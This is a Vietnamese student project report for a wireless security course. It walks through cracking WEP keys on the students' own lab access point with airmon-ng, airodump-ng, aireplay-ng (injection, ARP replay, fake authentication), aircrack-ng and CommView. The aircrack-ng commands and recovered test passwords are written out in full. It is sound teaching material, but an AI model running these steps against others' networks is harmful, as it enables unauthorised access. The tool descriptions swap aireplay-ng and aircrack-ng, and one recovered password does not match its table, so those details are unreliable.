# **Báo cáo đồ án môn học**
## Môn học: An toàn mạng không dây và di động
## **Đề tài: CRACKING WEP**
### GVHD: **Lê Kim Hùng**
### Sinh viên: **Phạm Lam Khê 17520007 -- Cao Bá Kiệt 17520659**
### **A. Chuẩn bị**
#### **1. Các thiết bị dùng trong phần thực hành**
* Access point: TL-WR740N
* Adapter: TL-WN722N-v2
* Máy ảo: Kali linux-v5.4
#### **2. Các công cụ dùng trong bài thực hành**
* Aireplay-ng – Most popular Perl-based WEP encryption cracking tool
* Aircrack-ng – ARP spoof/injection using aireplay-ng
* Kismet – Network Sniffer, can grab IVs as well
* Airodump – GrabbingIVs
* Commview – Capturing the Packets in Windows
#### **3. Mô Hình**
![sa](https://drive.google.com/uc?id=1aHCm0PJLO8PYOZOUbA4uDkjaSs8BpUC0)
### **B. Thực hiện**
#### **I.Sử dụng Airmon-ng, Airodump-ng, Aireplay-ng, kismet để crack password**
**Các bước thực hiện:**
Bước 1: Tìm kiếm Wireless Adapter
#airmon-ng
Bước 2: Bật chế độ monitor cho wireless adapter
#airmon-ng start wlan0
Bước 3: Tìm kiếm các access point xung quanh và các client (station) kết nối tới nó
#airodump-ng wlan0mon 
Bước 4: Kiểm tra xem có thể thực hiện injection attack tới AP không ?
#aireplay-ng -9 -e [SSID] -a [BSSID] wlan0mon
Bước 5: Bắt các IV được sinh ra từ Access point
#airodump-ng --bssid [bSSID] -c [Channel of AP] -w [tên file capture] wlan0mon
Bước 6: Sinh traffic giữa Access point và station. (Các gói ARP request được gửi và AP sẽ phản hồi, qua đó các IV được sinh ra và chúng ta sẽ bắt các IV này)
#aireplay-ng -3 -b [bssid] -h [MAC station] wlan0mon
Bước 7: Fake authentication với AP
#aireplay-ng -1 0 -e [SSID] -a [bSSID] -h [MAC station] wlan0mon
Bước 8: Quay về bước 5, xem thử số lượng packet bắt được đã đủ để crack chưa ? Thường thì khoảng 20000 đối với key length =64bits và 900000 đối với key length=128bits. Kết thúc quá trình bắt IV và sử dụng aircrack để tìm key
#Aircrack-ng [tên file capture đã bắt ở trên]

**Thực hiện 4 lần**
|STT     | SSID      | Password  |  Keylength        | Kết Quả  |
| ------------- |:-------------:| -----:|:-------------:| -----:|
| 1   | MrKiett007 |_*KietKhe.@/; |128-bits| Thành công|
| 2   | MrKiett007  |  CaoBaKiet1999 |128-bits|Thành công|
|3 | MrKiett007 |   MrA12 |64-bits|Thành công|
|4|MrKiett007|  Mr_*1 |64-bits|Thành công|

**Chi tiết các bước thực hiện:**
Bước 1: Tìm kiếm Wireless Adapter
#airmon-ng
![sa](https://drive.google.com/uc?id=1uw_2dOEvhjbrrw39FNjiHV-W9HovPF3k)
Bước 2: Bật chế độ monitor cho wireless adapter
#airmon-ng start wlan0
![sa](https://drive.google.com/uc?id=1klvZX7Vj4l27zTVmuFzCbkknZJ36qB5p)
Bước 3: Tìm kiếm các access point xung quanh và các client (station) kết nối tới nó
#airodump-ng wlan0mon 
![sa](https://drive.google.com/uc?id=1e9V3GUB15kzb4qrJDE94RguO1HMLOdPK)
Bước 4: Kiểm tra xem có thể thực hiện injection attack tới AP không ?
#aireplay-ng -9 -e MrKiett007-a 62:FF:3E:5A:58:C1 wlan0mon
![sa](https://drive.google.com/uc?id=1uxm-idFgvZ5wYasNEURXoABnXALi00dR)
Bước 5: Bắt các IV được sinh ra từ Access point
#airodump-ng –bssid 62:FF:3E:5A:58:C1 -c 1 -w WEPcrack wlan0mon
![sa](https://drive.google.com/uc?id=1TE5gIzEYoWYW751QPy6p0rQitV_cZrUB)
Bước 6: Sinh traffic giữa Access point và station. (Các gói ARP request được gửi và AP sẽ phản hồi, qua đó các IV được sinh ra và chúng ta sẽ bắt các IV này)
#aireplay-ng -3 -b 62:FF:3E:5A:58:C1 -h 0C:9D:92:6E:AD:CE wlan0mon
![sa](https://drive.google.com/uc?id=1XDJcZXvDwVbhu2oRqu5ueBXxtbrMnjCQ)
Bước 7: Fake authentication với AP
#aireplay-ng -1 0 -e MrKiett007 -a 62:FF:3E:5A:58:C1 -h 0C:9D:92:6E:AD:CE wlan0mon
![sa](https://drive.google.com/uc?id=1vmrTDRr4ZRH7GWkaXZvIz61xFFGcrrRd)
Bước 8: Quay về bước 5, xem thử số lượng packet bắt được đã đủ để crack chưa? Thường thì khoảng 20000 đối với key length =64bits và 900000 đối với key length=128bits. Kết thúc quá trình bắt IV và sử dụng aircrack để tìm key
#Aircrack-ng WEPcrack-01.cap
![sa](https://drive.google.com/uc?id=1Ar-9jMWRtuKf14EEidEA6OFoufx6MUy_)
![sa](https://drive.google.com/uc?id=1_LqFv5njNnMt8-5ANaBGzK4tWKCBUKLO)
* ==> tìm được key : _*KietKhe.@/;

**Làm tương tự với 3 trường hợp còn lại:**
Kết quả:
![sa](https://drive.google.com/uc?id=10MKiqhKt1L1r4MzCQqTGlo3_HmK3f5wD)
![sa](https://drive.google.com/uc?id=1T7wnhI2tkVsIPaS9STrJIO5X4ysK682F)
![sa](https://drive.google.com/uc?id=1rrWt5BUhcwyHifX16vF7ZrZg2WqlhwOr)
#### **II.Sử dụng công cụ Comview và aircrack-ng để tìm password**
**Qui trình thực hiện:**
* Bước 1: Dùng comview để bắt gói tin chứa IV
* Bước 2: Dùng Aircrack-ng để tìm password

 |STT     | SSID      | Password  |  Keylength        | Kết Quả  |
| ------------- |:-------------:| -----:|:-------------:| -----:|
| 1   | MrKiett007 |_*KietKhe.@/; |128-bits| Thành công|
| 2   | MrKiett007  |  CaoBaKiet1999 |128-bits|Thành công|
**Chi tiết thực hiện:**
Bước 1: Chọn Capture Packet, vào loging để chỉnh dung lượng file log và nơi lưu trữ:
![sa](https://drive.google.com/uc?id=1Q116yxgW5UeJnRkT7PAjwhSzP3LsDaRo)
Bước 2: Vào Nodes và cấu hình scaner mode trên tất cả các channel
![sa](https://drive.google.com/uc?id=1FnH8ipAHtR8JKaZiZOozRRV2uQ-JnYTj)
Bước 3: Chọn Start Capture và quan sát thông tin liên quan đến trạm wifi cần tìm password
![sa](https://drive.google.com/uc?id=1Ld98sXavr3T1i0Bs37KSsLlLvadcgeyh)
Bước 4: Chọn Single channel mode, và chọn channel thích hợp (VD: là channel 2)
![sa](https://drive.google.com/uc?id=147xuSDynLMEtdPk6-v_E_qBasmfqQm7V)
Bước 5: Sau một thời gian đợi số lượng gói tin bắt được đủ lớn thì dừng. Số lượng gói tin cần bắt phụ thuộc vào độ phức tạp của key.
**=>Vào File -> Log viewer và mở file log vừa bắt ở trên lên để đọc file log**
![sa](https://drive.google.com/uc?id=1P7_Tc3PPnm4OXm_3MQsnxc9ak3KRZ2QS)
Bước 6: Chọn File -> export logs -> wireshark/tcpdump format và lưu lại file .cap
![sa](https://drive.google.com/uc?id=1eWIPG86Zxlmq-5vUNfPFJH3rgTkI7v40)
Bước 7: dùng aircrack để tìm password. Copy file .cap đã lưu vào máy kali sau đó dùng lệnh aircack-ng [ten file] 
![sa](https://drive.google.com/uc?id=1HzWajrfP8gYguY2NiI9NfT4OVIL4qQ4P)
==> Đã tìm được password (  _*MraK12.@#/;  )
**Làm tương tự với trường hợp còn lại. Kết quả:**
![sa](https://drive.google.com/uc?id=1rMJasjiPx1NEbXk3CdFRk6SdQnqnh45X)











